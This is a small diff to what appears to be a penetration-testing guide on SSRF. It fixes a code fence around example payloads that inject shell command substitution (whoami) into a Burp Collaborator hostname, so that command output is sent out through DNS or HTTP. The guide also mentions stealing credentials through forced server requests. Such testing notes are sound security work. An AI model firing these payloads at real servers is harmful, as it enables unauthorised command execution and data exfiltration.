@@ -34,7 +34,7 @@ If you can make the vulnerable server request these, you can steal credentials.
    ```
    eg: if you have a website like:`http://example.burpcollaporator.net` ⇒ you can make RCE like :<br>
 
-````http://`whoami`.example.burpcollaporator.net``` OR `http://$(whoami).example.burpcollaporator.net`<br>
+```http://`whoami`.example.burpcollaporator.net``` OR `http://$(whoami).example.burpcollaporator.net`<br>
    If you see an HTTP/DNS hit, SSRF is confirmed.
 
 2. **Pivot to internal targets**  
